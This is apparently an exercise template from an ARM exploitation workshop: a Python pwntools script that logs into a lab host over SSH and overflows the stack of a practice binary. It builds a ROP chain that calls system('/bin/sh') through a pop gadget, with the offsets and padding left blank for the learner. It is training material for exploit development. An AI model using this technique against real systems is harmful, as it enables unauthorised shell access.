#!/usr/bin/env python2

from pwn import *

ip = "192.168.1.xxx"
port = 22
user = "userX"
pwd = "passX"

libc = ELF('/home/arm/Workshop/exploits/gadgets/libc-2.24.so')

gadget_offset = ???
libc_base = ???

#set the gadget address
gadget_address = libc_base + ???
system_address = libc_base + libc.symbols['system']
shell_address = libc_base + next(libc.search("/bin/sh"))

shell = ssh(user, ip, password=pwd, port=port)

sh = shell.run('/home/userX/Workshop/exploits/stack_sh/stack_sh')

#setting the padding length
padding_length = ??
payload = "A"*padding_length

payload += p32(gadget_address)       # gadget address - pop {r0, r4, pc}
payload += p32(shell_address)        # r0 - address of /bin/sh
payload += p32(0x42424242)           # r4 - not important
payload += p32(system_address)       # pc - system address
sh.sendline(payload)

sh.interactive()

shell.close()